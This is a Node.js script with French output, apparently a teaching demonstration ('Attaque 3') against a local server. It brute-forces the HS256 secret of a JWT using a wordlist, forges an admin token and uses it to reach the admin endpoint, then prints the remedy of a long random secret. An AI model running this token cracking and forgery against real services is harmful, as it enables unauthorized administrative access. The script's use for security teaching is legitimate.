const crypto = require('crypto');
const fs     = require('fs');
const path   = require('path');

const BASE_URL = 'http://localhost:3000';

const BUILT_IN_WORDLIST = [
  'password', '123456', 'admin', 'letmein', 'qwerty', 'abc123',
  'monkey', 'dragon', 'master', 'welcome', 'login', 'pass',
  'test', 'root', 'user', 'key', 'hello', 'world',
  'secret', 'mysecret', 'jwt', 'jwtkey', 'jwt_secret', 'secretkey',
  'supersecret', 'token', 'mytoken', 'authkey', 'hmackey',
  'password1', 'Password1', 'p@ssword', 's3cr3t', 'S3cr3t',
];

function banner(title) {
  console.log('\n' + '─'.repeat(60));
  console.log(' ' + title);
  console.log('─'.repeat(60));
}

function tryCandidateSecret(headerB64, payloadB64, tokenSig, candidate) {
  const expected = crypto
    .createHmac('sha256', candidate)
    .update(`${headerB64}.${payloadB64}`)
    .digest('base64url');
  return expected === tokenSig;
}

async function run() {
  banner('ATTAQUE 3 : Force brute du secret HS256 (offline)');

  console.log('\n[1] Obtention d\'un token JWT HS256 valide (login alice)...');
  const loginRes = await fetch(`${BASE_URL}/auth/login`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ username: 'alice', password: 'password123' }),
  });
  const { token } = await loginRes.json();
  console.log('    Token intercepté :', token);

  const parts = token.split('.');
  if (parts.length !== 3) {
    console.error('Format de token inattendu'); process.exit(1);
  }
  const [headerB64, payloadB64, tokenSig] = parts;

  const args        = process.argv.slice(2);
  const wlIdx       = args.indexOf('--wordlist');
  const wordlistArg = wlIdx !== -1 ? args[wlIdx + 1] : null;

  let wordlist;
  let wordlistName;

  if (wordlistArg && fs.existsSync(wordlistArg)) {
    wordlistName = path.basename(wordlistArg);
    console.log(`\n[2] Dictionnaire externe : ${wordlistArg}`);
    wordlist = null;
  } else {
    wordlistName = 'dictionnaire intégré';
    console.log(`\n[2] Dictionnaire intégré (${BUILT_IN_WORDLIST.length} mots)`);
    wordlist = BUILT_IN_WORDLIST;
  }

  console.log(`\n[3] Démarrage de l'attaque par force brute (${wordlistName})...`);
  console.log('    Header JWT  :', headerB64);
  console.log('    Signature   :', tokenSig);
  console.log();

  const startTime = Date.now();
  let tested = 0;
  let found  = null;

  if (wordlist) {
    for (const word of wordlist) {
      tested++;
      process.stdout.write(`\r    Testé : ${tested.toString().padStart(5)} / ${wordlist.length} — candidat courant : "${word.padEnd(20)}"`);
      if (tryCandidateSecret(headerB64, payloadB64, tokenSig, word)) {
        found = word; break;
      }
    }
    process.stdout.write('\n');
  } else {
    const fileContent = fs.readFileSync(wordlistArg, 'latin1');
    const lines       = fileContent.split('\n');
    for (const line of lines) {
      const word = line.trim();
      if (!word) continue;
      tested++;
      if (tested % 10000 === 0) {
        process.stdout.write(`\r    Testé : ${tested.toLocaleString()} mots...`);
      }
      if (tryCandidateSecret(headerB64, payloadB64, tokenSig, word)) {
        found = word; break;
      }
    }
    process.stdout.write('\n');
  }

  const elapsedMs = Date.now() - startTime;
  const elapsed   = (elapsedMs / 1000).toFixed(3);
  const rate      = elapsedMs > 0 ? Math.round(tested / (elapsedMs / 1000)) : tested;

  console.log(`\n    Mots testés : ${tested.toLocaleString()}`);
  console.log(`    Durée       : ${elapsed}s`);
  console.log(`    Débit       : ~${rate.toLocaleString()} hash/s (Node.js mono-thread)`);

  if (found) {
    console.log(`\n✅ SECRET TROUVÉ : "${found}"`);
    console.log('\n[4] Exploitation — forge d\'un token admin avec le secret découvert...');

    function b64Encode(obj) { return Buffer.from(JSON.stringify(obj)).toString('base64url'); }
    const fHeader    = b64Encode({ alg: 'HS256', typ: 'JWT' });
    const fPayload   = b64Encode({ username: 'attacker', role: 'admin', iat: Math.floor(Date.now() / 1000) });
    const fSig       = crypto.createHmac('sha256', found).update(`${fHeader}.${fPayload}`).digest('base64url');
    const adminToken = `${fHeader}.${fPayload}.${fSig}`;

    const adminRes  = await fetch(`${BASE_URL}/api/admin`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    const adminData = await adminRes.json();
    console.log('    Accès admin :', adminRes.status, JSON.stringify(adminData));
  } else {
    console.log('\n❌ Secret non trouvé dans ce dictionnaire.');
    if (!wordlistArg) console.log('   → Essayez avec rockyou.txt : --wordlist /path/to/rockyou.txt');
  }

  banner('FIN DE L\'ATTAQUE 3');
  console.log('\nCorrection : utiliser un secret aléatoire long (>= 256 bits).');
  console.log('Exemple :  crypto.randomBytes(32).toString("hex")\n');
}

run().catch(err => {
  console.error('\n[ERREUR] :', err.message);
  console.error('→ Assurez-vous que le serveur est lancé : node server.js\n');
  process.exit(1);
});
